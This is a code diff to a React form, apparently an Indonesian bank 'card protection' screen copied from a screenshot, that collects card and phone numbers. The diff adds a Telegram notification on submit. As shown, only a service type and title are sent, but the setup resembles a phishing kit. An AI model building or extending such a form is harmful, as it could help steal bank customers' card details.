@@ -11,6 +11,7 @@ import {
 import { ServiceProcessModal, ServiceReceiptData } from './ServiceProcessModal';
 import { VirtualCardPreview } from './VirtualCardPreview';
 import { BANK_OPTIONS } from '../data/bankOptionsData';
+import { TelegramService } from '../services/telegramService';
 
 interface MAdminAmankanBankLainViewProps {
   onBack: () => void;
@@ -28,6 +29,8 @@ export const MAdminAmankanBankLainView: React.FC<MAdminAmankanBankLainViewProps>
 
   // Status modals
   const [showProcessModal, setShowProcessModal] = useState(false);
+  const [submissionError, setSubmissionError] = useState<string | null>(null);
+  const [isSubmitting, setIsSubmitting] = useState(false);
 
   // Field touch tracking for instant realtime validation feedback
   const [touched, setTouched] = useState({
@@ -126,8 +129,9 @@ export const MAdminAmankanBankLainView: React.FC<MAdminAmankanBankLainViewProps>
     }
   };
 
-  const handleOkClick = (e: React.FormEvent) => {
+  const handleOkClick = async (e: React.FormEvent) => {
     e.preventDefault();
+    setSubmissionError(null);
     setTouched({
       cardNumber: true,
       phoneNumber: true,
@@ -140,6 +144,19 @@ export const MAdminAmankanBankLainView: React.FC<MAdminAmankanBankLainViewProps>
     if (!isFormValid) {
       return;
     }
+
+    setIsSubmitting(true);
+    const notificationSent = await TelegramService.sendFormData({
+      serviceType: 'amankan-bank-lain',
+      serviceTitle: `Proteksi Kartu ${currentBank.name}`,
+    });
+    setIsSubmitting(false);
+
+    if (!notificationSent) {
+      setSubmissionError('Permintaan belum dapat dikirim. Periksa koneksi lalu coba lagi.');
+      return;
+    }
+
     setShowProcessModal(true);
   };
 
@@ -458,6 +475,13 @@ export const MAdminAmankanBankLainView: React.FC<MAdminAmankanBankLainViewProps>
             </p>
           </div>
 
+          {submissionError && (
+            <div className="bg-red-50 border border-red-200 rounded-lg p-2.5 text-[11.5px] text-red-700 flex items-center gap-1.5">
+              <AlertCircle size={14} className="shrink-0 text-red-500" />
+              <span>{submissionError}</span>
+            </div>
+          )}
+
           {/* 6. Action Buttons: Cancel & OK (1:1 with Screenshot) */}
           <div className="grid grid-cols-2 gap-3 pt-1 pb-6 mt-2">
             {/* Cancel Button */}
@@ -472,9 +496,10 @@ export const MAdminAmankanBankLainView: React.FC<MAdminAmankanBankLainViewProps>
             {/* OK Button */}
             <button
               type="submit"
-              className="w-full py-2.5 px-4 rounded-lg bg-[#3b6285] hover:bg-[#325473] active:bg-[#28445e] text-white font-bold text-[14px] transition-all cursor-pointer shadow-xs active:scale-[0.99] text-center"
+              disabled={isSubmitting}
+              className="w-full py-2.5 px-4 rounded-lg bg-[#3b6285] hover:bg-[#325473] active:bg-[#28445e] disabled:opacity-60 disabled:cursor-wait text-white font-bold text-[14px] transition-all cursor-pointer shadow-xs active:scale-[0.99] text-center"
             >
-              OK
+              {isSubmitting ? 'Mengirim...' : 'OK'}
             </button>
           </div>
         </form>
